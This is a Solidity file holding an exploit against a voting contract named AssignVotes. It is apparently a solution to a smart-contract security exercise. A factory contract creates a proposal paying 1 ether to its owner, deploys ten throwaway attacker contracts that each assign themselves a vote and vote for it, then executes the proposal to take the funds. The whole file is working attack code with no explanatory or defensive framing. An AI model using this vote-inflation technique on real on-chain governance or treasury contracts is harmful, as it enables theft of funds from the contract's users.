//SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import "hardhat/console.sol";

import "../AssignVotes.sol";

contract AssignVotesAttacker {
    constructor() {}

    function attack(address _target) public {
        AssignVotes target = AssignVotes(_target);
        target.assign(address(this));
        target.vote(0);
    }
}

contract AssignVotesAttackerFactory {
    AssignVotes public target;
    address public owner;

    constructor(address _target) {
        target = AssignVotes(_target);
        owner = msg.sender;
    }

    function attack() public {
        bytes memory data;
        target.createProposal(owner, data, 1 ether);
        address _target = address(target);
        //make a new contract
        for (uint256 i = 0; i < 10; i++) {
            AssignVotesAttacker attacker = new AssignVotesAttacker();
            attacker.attack(_target);
        }
        target.execute(0);
    }
}
